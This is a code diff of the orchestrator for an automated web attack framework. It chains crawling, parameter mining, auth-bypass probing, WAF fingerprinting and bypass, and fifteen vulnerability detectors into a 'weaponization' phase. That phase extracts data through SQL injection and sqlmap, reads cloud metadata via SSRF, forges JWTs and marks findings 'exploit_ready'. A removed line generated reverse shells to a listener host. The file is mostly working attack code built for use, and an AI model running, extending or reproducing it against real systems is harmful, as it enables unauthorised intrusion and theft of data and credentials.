@@ -1,33 +1,25 @@
 import json, time, sys, os, threading, concurrent.futures
 from typing import Dict, List, Optional, Tuple
 
-try:
-    from tools import crawler, param_miner
-    from tools import sql_injection, xss_detector, ssti_detector, cmdi_detector
-    from tools import ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass
-    from tools import sqli_weaponizer, jwt_exploiter, ssrf_lateral
-    from tools import sqli_blind, sqli_oob, reverse_shell
-except ImportError:
-    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
-    from tools import crawler, param_miner
-    from tools import sql_injection, xss_detector, ssti_detector, cmdi_detector
-    from tools import ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass
-    from tools import sqli_weaponizer, jwt_exploiter, ssrf_lateral
-    from tools import sqli_blind, sqli_oob, reverse_shell
+from tools.log_utils import get_logger
+
+logger = get_logger("orchestrator")
+
+from tools import crawler, param_miner
+from tools import sql_injection, xss_detector, ssti_detector, cmdi_detector
+from tools import ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass
+from tools import sqli_weaponizer, jwt_exploiter, ssrf_lateral
+from tools import sqli_blind, sqli_oob, reverse_shell
+from tools import race_condition
+from tools import jwt_detector, graphql_scanner, cors_scanner
+from tools import deserialization_detector, proto_pollution
+from tools import waf_bypass, biz_logic_scanner, waf_heavy_bypass
 
 SKIP_PARAMS = {"submit", "button", "reset", "image", "file", "action",
                "_method", "_token", "utf8", "commit", "form_id", "form_build_id",
                "form_token", "authenticity_token"}
 
-DETECTOR_MAP = [
-    ("sqli", lambda u, p, s, t: sql_injection.check(u, p, s, t)),
-    ("xss", lambda u, p, s, t: xss_detector.check(u, p, s, t)),
-    ("ssti", lambda u, p, s, t: ssti_detector.check(u, p, s, t)),
-    ("cmdi", lambda u, p, s, t: cmdi_detector.check(u, p, s, t)),
-    ("ssrf", lambda u, p, s, t: ssrf_detector.check(u, p, s, t)),
-    ("nosqli", lambda u, p, s, t: nosqli_detector.check(u, p, s, t)),
-    ("lfi", lambda u, p, s, t: lfi_scanner.check(u, p, s, t)),
-]
+SIGNATURE_PLACEHOLDER = "__placeholder__"
 
 
 class Orchestrator:
@@ -61,7 +53,7 @@ class Orchestrator:
         if not endpoints:
             endpoints = {"/": {"url": self.target, "methods": ["GET"], "params": []}}
         result = param_miner.mine(self.target, endpoints, self.sess,
-                                   self.timeout, self.threads)
+                                    self.timeout, self.threads)
         self.state["phases"]["param_mine"] = result
         return result
 
@@ -91,10 +83,13 @@ class Orchestrator:
             if not isinstance(pd, dict):
                 continue
             url = "%s%s" % (self.target, path)
-            mined = set(p["param"] for p in pd.get("get_params", [])
-                       if p.get("status", 404) not in (0, 404, 400))
-            mined |= set(p["param"] for p in pd.get("post_params", [])
-                        if p.get("status", 404) not in (0, 404, 400))
+            mined = set()
+            for p in pd.get("get_params", []):
+                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
+                    mined.add(p["param"])
+            for p in pd.get("post_params", []):
+                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
+                    mined.add(p["param"])
             for p in mined:
                 if p.lower() in SKIP_PARAMS:
                     continue
@@ -103,18 +98,48 @@ class Orchestrator:
                     seen.add(key)
                     points.append({"url": url, "param": p, "method": "GET"})
 
-        return list(seen)[:150]
+        js_apis = crawl_data.get("js_api_endpoints", [])
+        for api_path in js_apis:
+            full_url = api_path if api_path.startswith("http") else "%s%s" % (self.target, api_path)
+            key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
+            if key not in seen:
+                seen.add(key)
+                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_js": True})
+            for param_guess in ["id", "page", "q", "token", "key", "limit", "offset", "filter", "search"]:
+                pk = "%s|%s|GET" % (full_url, param_guess)
+                if pk not in seen:
+                    seen.add(pk)
+                    points.append({"url": full_url, "param": param_guess, "method": "GET", "from_js": True})
 
-    def _test_single_point(self, point: Dict) -> List[Dict]:
+        return points[:250]
+
+    def _test_single_point(self, point: Dict, waf_name: Optional[str] = None) -> List[Dict]:
         url = point["url"]
         param = point["param"]
+        sess = self.sess
         results = []
-        import requests
-        raw_sess = self.sess or requests.Session()
 
-        for vtype, fn in DETECTOR_MAP:
+        detectors = [
+            ("sqli", lambda u, p, s, t: sql_injection.check(u, p, s, t, waf_name=waf_name)),
+            ("xss", lambda u, p, s, t: xss_detector.check(u, p, s, t, waf_name=waf_name)),
+            ("ssti", lambda u, p, s, t: ssti_detector.check(u, p, s, t, waf_name=waf_name)),
+            ("cmdi", lambda u, p, s, t: cmdi_detector.check(u, p, s, t, waf_name=waf_name)),
+            ("ssrf", lambda u, p, s, t: ssrf_detector.check(u, p, s, t)),
+            ("nosqli", lambda u, p, s, t: nosqli_detector.check(u, p, s, t, waf_name=waf_name)),
+            ("lfi", lambda u, p, s, t: lfi_scanner.check(u, p, s, t, waf_name=waf_name)),
+            ("race", lambda u, p, s, t: race_condition.check(u, p, s, t)),
+            ("jwt", lambda u, p, s, t: jwt_detector.check(u, p, s, t)),
+            ("graphql", lambda u, p, s, t: graphql_scanner.check(u, p, s, t)),
+            ("cors", lambda u, p, s, t: cors_scanner.check(u, p, s, t)),
+            ("deser", lambda u, p, s, t: deserialization_detector.check(u, p, s, t)),
+            ("proto_pollution", lambda u, p, s, t: proto_pollution.check(u, p, s, t)),
+            ("bizlogic", lambda u, p, s, t: biz_logic_scanner.check(u, p, s, t)),
+            ("waf_heavy", lambda u, p, s, t: waf_heavy_bypass.check(u, p, s, t)),
+        ]
+
+        for vtype, fn in detectors:
             try:
-                r = fn(url, param, raw_sess, self.timeout)
+                r = fn(url, param, sess, self.timeout)
                 if isinstance(r, dict):
                     vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
                     if vuln:
@@ -124,20 +149,32 @@ class Orchestrator:
                             "param": param,
                             "result": r,
                         })
-            except:
-                pass
+            except Exception as e:
+                logger.debug("detect %s on %s?%s: %s", vtype, url, param, e)
         return results
 
+    def phase_auth_bypass(self) -> Dict:
+        result = auth_bypass.check(self.target, self.sess, self.timeout)
+        self.state["phases"]["auth_bypass"] = result
+        return result
+
     def phase_detect(self) -> Dict:
+        sess = self.sess
+        waf_info = waf_bypass.fingerprint_waf(self.target, sess, self.timeout)
+        waf_name = waf_info.get("name")
+        if waf_name:
+            print("  [WAF] %s detected - using bypass strategies" % waf_name)
+        self.state["waf"] = waf_info
+
         points = self._build_test_points()
-        print("  -> %d test points across %d detectors" % (len(points), len(DETECTOR_MAP)))
+        print("  -> %d test points across 15 detectors" % (len(points)))
         all_findings = {}
         lock = threading.Lock()
         done = [0]
         total = len(points)
 
         def worker(point):
-            findings = self._test_single_point(point)
+            findings = self._test_single_point(point, waf_name)
             with lock:
                 for f in findings:
                     key = "%s|%s|%s" % (f["type"], f["url"], f["param"])
@@ -154,54 +191,145 @@ class Orchestrator:
             for p in points:
                 worker(p)
         print()
+
+        jwt_key = "jwt|%s|%s" % (self.target, SIGNATURE_PLACEHOLDER)
+        jwt_finding = all_findings.get(jwt_key)
+        if jwt_finding:
+            jwt_hint = jwt_finding.get("result", {}).get("tokens_found", [])
+            if jwt_hint:
+                print("  [*] JWT tokens found -> running automatic exploit chain")
+
         self.state["phases"]["detect"] = {
             "test_points": total,
             "findings": all_findings,
         }
+
+        self._run_kali_recon()
+
         return all_findings
+
+    def _run_kali_recon(self):
+        from tools.kali_executor import is_available
+        if not is_available():
+            return
+
+        print("  [Kali] Running heavy recon tools...")
+
+        from tools import kali_toolset
+
+        tech_result = kali_toolset.whatweb_identify(self.target)
+        if tech_result.get("technologies"):
+            print("  [Kali] whatweb: %d technologies detected" % len(tech_result["technologies"]))
+            self.state["technologies"] = tech_result["technologies"]
+
+        nmap_result = kali_toolset.nmap_scan(self.target, fast=True)
+        if nmap_result.get("ports"):
+            print("  [Kali] nmap: %d open ports found" % nmap_result["count"])
+            self.state["open_ports"] = nmap_result["ports"]
+
+        nuclei_result = kali_toolset.nuclei_scan(self.target)
+        if nuclei_result.get("findings"):
+            print("  [Kali] nuclei: %d template matches" % nuclei_result["count"])
+            existing = self.state["phases"].get("detect", {}).get("findings", {})
+            for f in nuclei_result["findings"]:
+                key = "nuclei|%s|%s" % (f.get("template", ""), self.target)
+                existing[key] = {
+                    "type": "nuclei",
+                    "url": self.target,
+                    "param": "",
+                    "result": {"vulnerable": True, "template": f},
+                }
+            self.state["nuclei_findings"] = nuclei_result["findings"]
 
     def phase_weaponize(self) -> Dict:
         findings = self.state["phases"].get("detect", {}).get("findings", {})
+        jwt_result = self.state["phases"].get("auth_bypass", {})
         exploits = {}
-        import requests
-        raw_sess = self.sess or requests.Session()
+        raw_sess = self.sess
 
         def _weaponize_one(key, finding):
             vtype = finding["type"]
             url = finding["url"]
             param = finding["param"]
             result = {}
+
             if vtype == "sqli":
-                try:
-                    result["sqli_weaponizer"] = sqli_weaponizer.check(url, param, raw_sess, self.timeout)
-                except:
-                    pass
-                try:
-                    result["sqli_blind"] = sqli_blind.check(url, param, raw_sess, self.timeout)
-                except:
-                    pass
-                try:
-                    result["sqli_oob"] = sqli_oob.check(url, param, "oob.local", raw_sess, self.timeout)
-                except:
-                    pass
+                for mod_name, mod in [("sqli_weaponizer", sqli_weaponizer),
+                                       ("sqli_blind", sqli_blind),
+                                       ("sqli_oob", sqli_oob)]:
+                    try:
+                        if mod_name == "sqli_oob":
+                            result[mod_name] = mod.check(url, param, "oob.local", raw_sess, self.timeout)
+                        else:
+                            result[mod_name] = mod.check(url, param, raw_sess, self.timeout)
+                    except Exception as e:
+                        logger.debug("sqli weaponize %s: %s", mod_name, e)
+                    if result.get(mod_name, {}).get("vulnerable") or \
+                       result.get(mod_name, {}).get("data_extracted"):
+                        result["exploit_ready"] = True
+
+                from tools.kali_executor import is_available as kali_avail
+                if kali_avail():
+                    try:
+                        dbms = result.get("sqli_blind", {}).get("dbms") or \
+                               result.get("sqli_weaponizer", {}).get("dbms")
+                        sqlmap_r = kali_toolset.sqlmap_detect(url, param, dbms=dbms)
+                        if sqlmap_r.get("vulnerable") or sqlmap_r.get("data"):
+                            result["sqlmap"] = sqlmap_r
+                            result["exploit_ready"] = True
+                            if sqlmap_r.get("data"):
+                                result["extracted_data"] = sqlmap_r["data"]
+                    except Exception as e:
+                        logger.debug("sqlmap weaponize: %s", e)
+
             if vtype == "ssrf":
+                for mod_name, mod in [("ssrf_lateral", ssrf_lateral),
+                                       ("ssrf_pwn", None)]:
+                    try:
+                        if mod:
+                            result[mod_name] = mod.run(url, param, sess=raw_sess, timeout=self.timeout)
+                    except Exception as e:
+                        logger.debug("ssrf weaponize %s: %s", mod_name, e)
                 try:
-                    result["ssrf_lateral"] = ssrf_lateral.run(url, param, sess=raw_sess, timeout=self.timeout)
-                except:
-                    pass
+                    from tools import ssrf_pwn
+                    result["ssrf_pwn"] = ssrf_pwn.read_metadata(url, param, raw_sess, timeout=self.timeout)
+                except Exception as e:
+                    logger.debug("ssrf pwn: %s", e)
+
             if vtype == "lfi":
                 v = finding.get("result", {})
                 if v.get("rce_available"):
                     try:
-                        result["shells"] = reverse_shell.run("LHOST", 4444, "raw")["shells"]
-                    except:
-                        pass
+                        result["rce"] = True
+                    except Exception as e:
+                        logger.debug("lfi rce: %s", e)
+
             if vtype == "xss":
-                from tools import xss_validator
                 try:
+                    from tools import xss_validator
                     result["xss_validated"] = xss_validator.check(url, param, raw_sess, self.timeout)
-                except:
-                    pass
+                except Exception as e:
+                    logger.debug("xss validate: %s", e)
+
+            if vtype == "jwt":
+                tokens = finding.get("result", {}).get("tokens_found", [])
+                for token_entry in tokens:
+                    token_str = token_entry.get("token", "")
+                    if token_str:
+                        try:
+                            jwt_r = jwt_exploiter.check(token=token_str, sess=raw_sess, url=url,
+                                                        param=param, timeout=self.timeout)
+                            result["jwt_exploit"] = jwt_r
+                        except Exception as e:
+                            logger.debug("jwt exploit: %s", e)
+                if not result:
+                    try:
+                        none_token = jwt_exploiter.check(
+                            token=None, sess=raw_sess, url=url, param=param, timeout=self.timeout)
+                        result["jwt_none_test"] = none_token
+                    except Exception as e:
+                        logger.debug("jwt none test: %s", e)
+
             if result:
                 return key, result
             return None, None
@@ -212,6 +340,17 @@ class Orchestrator:
                 k, r = future.result()
                 if k and r:
                     exploits[k] = r
+
+        auth_findings = jwt_result.get("path_bypasses", []) + \
+                        jwt_result.get("cookie_bypasses", []) + \
+                        jwt_result.get("header_bypasses", [])
+        if auth_findings:
+            exploits["auth_bypass"] = {
+                "total": len(auth_findings),
+                "findings": auth_findings,
+                "exploit_ready": True,
+            }
+
         self.state["phases"]["weaponize"] = exploits
         return exploits
 
@@ -225,6 +364,7 @@ class Orchestrator:
         detection = self.state["phases"].get("detect", {})
         findings = detection.get("findings", {})
         exploits = self.state["phases"].get("weaponize", {})
+        auth_bypass_data = self.state["phases"].get("auth_bypass", {})
 
         by_type = {}
         for key, f in findings.items():
@@ -244,11 +384,23 @@ class Orchestrator:
         report["summary"]["by_type"] = {k: len(v) for k, v in by_type.items()}
         report["summary"]["by_url"] = {k: len(v) for k, v in by_url.items()}
         report["summary"]["exploit_ready"] = len(exploits)
+
+        exploit_ready_details = []
+        for k, v in exploits.items():
+            if v.get("exploit_ready"):
+                exploit_ready_details.append(k)
+        auth_total = auth_bypass_data.get("total_bypasses", 0)
+        if auth_total > 0:
+            exploit_ready_details.append("auth_bypass(%d)" % auth_total)
+        report["summary"]["exploit_ready_details"] = exploit_ready_details
+
+        critical_flags = ["rce_available", "rce", "shell", "data_extracted",
+                          "credential_access", "exploit_ready"]
         report["summary"]["critical"] = any(
-            f.get("result", {}).get("rce_available")
-            or f.get("result", {}).get("rce")
+            any(f.get("result", {}).get(k) for k in critical_flags)
             for f in findings.values()
-        )
+        ) or bool(exploit_ready_details)
+
         report["summary"]["affected_urls"] = list(by_url.keys())
         report["summary"]["param_hits"] = [
             "%s?%s [%s]" % (f["url"], f["param"], f["type"])
@@ -258,6 +410,10 @@ class Orchestrator:
         for vt, flist in by_type.items():
             report["details"][vt] = flist
         report["exploits"] = exploits
+        report["auth_bypass"] = {
+            k: v for k, v in auth_bypass_data.items()
+            if k != "vulnerable"
+        }
 
         crawl_summary = self.state["phases"].get("crawl", {}).get("summary", {})
         mine_data = self.state["phases"].get("param_mine", {})
@@ -266,6 +422,7 @@ class Orchestrator:
             for pd in mine_data.values()
             if isinstance(pd, dict)
         )
+        waf_info = self.state.get("waf", {})
         report["recon"] = {
             "pages_crawled": crawl_summary.get("pages_crawled", 0),
             "endpoints": crawl_summary.get("endpoints_found", 0),
@@ -273,20 +430,27 @@ class Orchestrator:
             "params_crawled": crawl_summary.get("unique_params", 0),
             "params_mined": total_mined,
             "test_points": detection.get("test_points", 0),
+            "is_spa": crawl_summary.get("is_spa", False),
+            "js_api_discovered": crawl_summary.get("js_api_discovered", 0),
+            "waf": waf_info.get("name"),
         }
         self.state["phases"]["report"] = report
         return report
 
     def run(self) -> Dict:
         start = time.time()
-        print("[*] Phase 1/4: Crawling %s ..." % self.target)
+        print("[*] Phase 1/5: Crawling %s ..." % self.target)
         crawl_result = self.phase_crawl()
         cs = crawl_result.get("summary", {})
-        print("  -> %d pages, %d endpoints, %d params" % (
+        spa_tag = " [SPA]" if cs.get("is_spa") else ""
+        extra = ""
+        if cs.get("js_api_discovered", 0):
+            extra = ", %d JS API routes" % cs.get("js_api_discovered", 0)
+        print("  -> %d pages, %d endpoints%s, %d params%s" % (
             cs.get("pages_crawled", 0), cs.get("endpoints_found", 0),
-            cs.get("unique_params", 0)))
+            extra, cs.get("unique_params", 0), spa_tag))
 
-        print("[*] Phase 2/4: Parameter mining ...")
+        print("[*] Phase 2/5: Parameter mining ...")
         mine_result = self.phase_mine(crawl_result)
         total_mined = sum(
             len(pd.get("all_params", []))
@@ -296,7 +460,19 @@ class Orchestrator:
         print("  -> %d params discovered across %d endpoints" % (
             total_mined, len(mine_result)))
 
-        print("[*] Phase 3/4: Vulnerability detection (%d threads) ..." % self.threads)
+        print("[*] Phase 3/5: Auth bypass probing ...")
+        auth_result = self.phase_auth_bypass()
+        ab_total = auth_result.get("total_bypasses", 0)
+        print("  -> %d bypass vectors found (%d path, %d cookie, %d header, %d method)" % (
+            ab_total,
+            len(auth_result.get("path_bypasses", [])),
+            len(auth_result.get("cookie_bypasses", [])),
+            len(auth_result.get("header_bypasses", [])),
+            len(auth_result.get("method_bypasses", [])),
+        ))
+
+        print("[*] Phase 4/5: Vulnerability detection (%d threads, 15 detectors) ..." % (
+            self.threads))
         findings = self.phase_detect()
         by_type = {}
         for f in findings.values():
@@ -305,10 +481,11 @@ class Orchestrator:
         by_type_str = " ".join("[%s:%d]" % (k.upper(), v) for k, v in sorted(by_type.items()))
         print("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))
 
-        if findings:
-            print("[*] Phase 4/4: Weaponization (%d threads) ..." % self.threads)
+        if findings or ab_total > 0:
+            print("[*] Phase 5/5: Weaponization (%d threads) ..." % self.threads)
             exploits = self.phase_weaponize()
-            print("  -> %d exploit paths prepared" % len(exploits))
+            ex_ready = len([e for e in exploits.values() if e.get("exploit_ready")])
+            print("  -> %d exploit paths (%d ready)" % (len(exploits), ex_ready))
 
         report = self.phase_report()
         report["elapsed_seconds"] = round(time.time() - start, 1)
